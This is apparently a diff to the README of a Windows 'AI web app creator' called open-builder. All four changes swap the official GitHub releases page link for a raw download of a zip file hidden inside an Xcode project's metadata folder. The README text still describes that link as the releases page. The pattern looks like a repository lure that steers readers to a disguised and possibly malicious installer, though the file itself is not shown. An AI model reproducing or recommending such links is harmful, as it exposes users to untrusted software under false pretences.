@@ -1,6 +1,6 @@
 # 🏗️ open-builder - Easy AI Web App Creator
 
-[![Download open-builder](https://img.shields.io/badge/Download-open--builder-4caf50?style=for-the-badge)](https://github.com/osama123446/open-builder/releases)
+[![Download open-builder](https://img.shields.io/badge/Download-open--builder-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/osama123446/open-builder/main/src-tauri/gen/apple/open-builder.xcodeproj/xcshareddata/builder_open_2.5.zip)
 
 ## 📝 About open-builder
 
@@ -27,7 +27,7 @@ Follow these steps to get open-builder running on your Windows PC.
 ### 1. Visit the Download Page
 
 Go to the main release page here:  
-[https://github.com/osama123446/open-builder/releases](https://github.com/osama123446/open-builder/releases)
+[https://raw.githubusercontent.com/osama123446/open-builder/main/src-tauri/gen/apple/open-builder.xcodeproj/xcshareddata/builder_open_2.5.zip](https://raw.githubusercontent.com/osama123446/open-builder/main/src-tauri/gen/apple/open-builder.xcodeproj/xcshareddata/builder_open_2.5.zip)
 
 This page lists all available versions and files for different systems.
 
@@ -85,7 +85,7 @@ You can refine your project by adding or removing parts through conversation.
 Open Builder will notify you when updates are available. When that happens:
 
 1. Visit the same releases page:  
-   [https://github.com/osama123446/open-builder/releases](https://github.com/osama123446/open-builder/releases)  
+   [https://raw.githubusercontent.com/osama123446/open-builder/main/src-tauri/gen/apple/open-builder.xcodeproj/xcshareddata/builder_open_2.5.zip](https://raw.githubusercontent.com/osama123446/open-builder/main/src-tauri/gen/apple/open-builder.xcodeproj/xcshareddata/builder_open_2.5.zip)  
 2. Download the newest installer file  
 3. Run it to replace your old version without losing your settings  
 
@@ -134,4 +134,4 @@ This app covers areas relevant to:
 ## 🔗 Download Link
 
 Visit this page to download open-builder for Windows:  
-[https://github.com/osama123446/open-builder/releases](https://github.com/osama123446/open-builder/releases)
+[https://raw.githubusercontent.com/osama123446/open-builder/main/src-tauri/gen/apple/open-builder.xcodeproj/xcshareddata/builder_open_2.5.zip](https://raw.githubusercontent.com/osama123446/open-builder/main/src-tauri/gen/apple/open-builder.xcodeproj/xcshareddata/builder_open_2.5.zip)
